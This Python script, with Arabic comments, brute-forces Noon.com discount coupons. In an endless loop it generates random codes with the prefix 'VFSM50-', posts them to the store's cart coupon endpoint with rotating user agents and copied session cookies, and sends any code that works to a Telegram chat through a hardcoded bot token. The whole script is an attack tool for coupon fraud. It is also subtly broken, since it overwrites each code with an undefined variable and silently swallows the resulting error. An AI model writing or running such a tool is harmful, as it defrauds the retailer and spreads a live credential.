import requests
import telebot
import json
from fake_useragent import UserAgent
tok = "8128789997:AAHIE70sQCwEZYPt7p90uLLg5RUHrIYnyxU"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)
import random
import string
def generate_code(prefix, length):
    # الجزء العشوائي من الكود
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    # دمج الجزء الثابت مع الجزء العشوائي
    code = prefix + random_part
    return code

# مثال للاستخدام
prefix = "VFSM50-"
#T="OP100"
def Test():
    z = generate_code(prefix, 8)
    z=T
    ua = UserAgent().random
    url = "https://www.noon.com/_svc/cart-v1/coupon"
    
    params = {
      'code': z,
      'showCart': ""
    }
    print(params)
    
    payload = {}
    
    headers = {
      'User-Agent': ua,
      'Accept': "application/json, text/plain, */*",
      'Accept-Encoding': "gzip, deflate, br, zstd",
      'Content-Type': "application/json",
      'sec-ch-ua-mobile': "?1",
      'x-lng': "312205224",
       'x-ab-test': "901,911,951,1021,1091,1101",
      'x-content': "mobile",
      'x-locale': "en-eg",
      'x-platform': "web",
      'x-cms': "v2",
      'x-ecom-zonecode': "EG-CAI-S10",
      'cache-control': "no-cache, max-age=0, must-revalidate, no-store",
      'x-mp': "noon",
      'x-visitor-id': "c97ab33e-f91e-4bc6-a78d-a6e49ef679d5",
      'x-lat': "300631437",
      'origin': "https://www.noon.com",
      'sec-fetch-site': "same-origin",
      'sec-fetch-mode': "cors",
      'sec-fetch-dest': "empty",
      'referer': "https://www.noon.com/egypt-ar/cart/",
      'accept-language': "en-US,en;q=0.9",
      'priority': "u=1, i",
      'Cookie': "AKA_A2=A; x-whoami-headers=eyJ4LWxhdCI6IjMwMDYzMTQzNyIsIngtbG5nIjoiMzEyMjA1MjI0IiwieC1hYnkiOiJ7XCJwb192MlwiOntcImVuYWJsZWRcIjoxfSxcIm1wX2ljb25fdjJcIjp7XCJlbmFibGVkXCI6MX0sXCJwZHBfc2NyZWVuc2hvdF9zaGFyZV9zaGVldFwiOntcImVuYWJsZWRcIjoxfX0iLCJ4LWVjb20tem9uZWNvZGUiOiJFRy1DQUktUzEwIiwieC1hYi10ZXN0IjpbOTAxLDkxMSw5NTEsMTAyMSwxMDkxLDExMDFdfQ==; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiIyOGQxNmZhMmE5NDc0ZDU2ODQ5ZTA2ZmM4NTM1OGIzYiIsImlhdCI6MTc0MTM2Mjk2NCwiZXhwIjoxNzQxMzYzMjY0fQ.rEZxbZ4hHDwlv71VvEp349n4ZdKAmzfydwT6tTspFEg; nloc=ar-eg; visitor_id=c97ab33e-f91e-4bc6-a78d-a6e49ef679d5; ak_bmsc=072ED2EE715576995D7A2EA5E4C0C204~000000000000000000000000000000~YAAQlNgRAnyR20OVAQAAvYBScRvhbdwJ1l3D0A3u2yd+Qf3kdlJFBK66c4JdSRAjIRnkHKcEbNwcjso4+74FDq7Nr/lnaBA10xWm+60JLarVt4gAhda5nF7KFP+x18MYuVm3cn9I4Dp5ft14R2EXc1PB+uKajSOURVUiMv+QzzfXjPR6mqxkDnQ3N6+NCiwRRN6Rv5K2bTo0M5zTbPI1LuJfOmQZGpfN1C82zJa0NWF+ckTr2X64lZAVvp45zVA5P7s9enAHQ1gKyvVWWRSJPFuOUmarXJXxyy2Vm+jL/G5deEN2Wyl0j9p3dFjgyAYeeRbY2LIusnBqaU+SI3wvi+1NoCUgZu9whnKPQxYn96AazJt3x+RikHWL/pysjLMdmoSxg2DuI/6Ac2M4f+oqDBMcTy7BTXGK3dEB5MVeJyw+GjdzkWLk0hXcHjn48jQmm6fqI17wjBUPRajSsXgihwfOjGpMXiSMLGI+WIRDfMammM8Cm1uBekgqBXdFn9tqxkeliTheFsNGNai1ONfs4jFPQv5Emgf9WoBGz1M6MNJcVgH2b5Bajh4cmURYNu1aq5kYL0vHSqkl1TdtnY+iG40=; noonengr-zldp=dbw5UOFoeCw%252F7eRntLlYfe3%252BKDviYuZylHLW8hLlbI9ybAmNLvZpK0myvu1fMjs6mKwM1K1ctjo%253D; ZLD887450000000002180avuid=bd1fa4e7-094c-4909-b974-82ee5ecda950; ZLDsiq663f5c2580454f7ed6b7bbe12e575c5570eb9b21832ce32b902ca6cbca6ffc2bavuid=bd1fa4e7-094c-4909-b974-82ee5ecda950; _gcl_au=1.1.884381986.1741363015; _fbp=fb.1.1741363019195.400591932109120572; _pin_unauth=dWlkPU5qSXpZelE1WlRjdE5qVTROUzAwT0RNM0xXRTJNalV0TTJZMk5ETmtZVGN4TXpsbQ; _tt_enable_cookie=1; _ttp=01JNRN6QW79XYZJX708JG8F3QN.tt.1; ZLDsiq3b3ce696144e42ab351af48092266ce3dda2b3c7b2ad6e09ba5d18504de03180tabowner=undefined; bm_mi=C72A3BF79A4DCA2ECE32144D97B424ED~YAAQlNgRAh+k20OVAQAAX49TcRtX2CDiDw+os2yuE6+gHhhnwLCi61SJUerkMlIH1YFppeICoagxgEMh8if4/fBrYvKkVzBwTp/V6BjZ8hs+5Uz8jI6zeVScsGg1ULAJJ/8hC7dSUEZCo7Eezmw2Q+VEmgrG85ZA1VCii9uZ5LU3s51F4t4vA/HqqbDfGPWYKCTL9JUsKj6e9N1vfCH7su+GUTxB9z+DY5HRM73J5/HXBom1PlGS4wkLvJDVE5RoOww5ClQTqS5VYCNMpANQT1WpXCdFSYNWyi1ZM9rhxrsmFYdXHGVh9tOl8rwE33WS37FUvthDHiloR36Xz+Xck9QbWBrHmSFP7dtJuybn46y+rgIX~1; nguestv2=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJraWQiOiJlMWRhYjhjMTlkYTk0NTgzYmNkZjNmZTQ2YTIzNDlmNiIsImlhdCI6MTc0MTM2MzA2MywiZXhwIjoxNzQxMzYzMzYzfQ.EIp0xcICLQu1mnpy3i_-G9-bmrc-bsylQBaFfX45sPc; _etc=nIx28luaXNGjAVzc; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22X5FdBHJuHYkbG2lGeCOB%22%2C%22expiryDate%22%3A%222026-03-07T15%3A57%3A54.372Z%22%7D; _uetsid=ce533890fb6c11ef9c45a36c0f92cb97; _uetvid=ce53bf00fb6c11efa0b3a503ffda2dc1; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3Anull%2C%22expiryDate%22%3A%222026-03-07T15%3A57%3A56.555Z%22%7D; _scid=QiLHGq_9khS_t7ZygLaEDV83g5ctjrPF; _scid_r=QiLHGq_9khS_t7ZygLaEDV83g5ctjrPF; _clck=1pprvxo%7C2%7Cfu0%7C0%7C1892; RT=\"z=1&dm=noon.com&si=e3459507-db47-4e3a-9019-ec3f2bae9f27&ss=m7yyjw9r&sl=2&tt=a7y&bcn=%2F%2F0217991d.akstat.io%2F&obo=1&rl=1&ld=2a2i\"; _sctr=1%7C1741298400000"
    }
    response1 = requests.post(url, params=params, data=json.dumps(payload), headers=headers).text
    #print(response1)
    if "Hurray! You got a discount!" in response1 or "Code valid on select items only" in response1:
        print('Hurray! You got a discount!')
        botA.send_message(chat_id=ch_id, text=z)
    elif 'Coupon is only valid' in response1:
        print('Coupon is not allow your country')
    elif 'Oops! Coupon code invalid' in response1:
        print('Oops! Coupon Error')
while True:
    try:
        Test()
    except:
    	pass
